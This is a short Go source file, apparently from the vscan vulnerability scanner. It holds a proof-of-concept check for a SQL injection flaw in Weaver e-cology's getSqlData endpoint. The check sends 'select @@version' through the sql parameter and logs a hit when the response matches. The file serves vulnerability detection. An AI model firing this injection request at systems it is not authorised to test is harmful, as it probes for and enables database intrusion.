package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

// getSqlData SQL注入漏洞

func GetSqlData(u string) bool {
	if req, err := pkg.HttpRequset(u+"/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "api_status"){
			pkg.GoPocLog(fmt.Sprintf("Found vuln weaver getSqlData SQL注入漏洞|%s\n", u+"/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version"))

			return true
		}
	}
	return false
}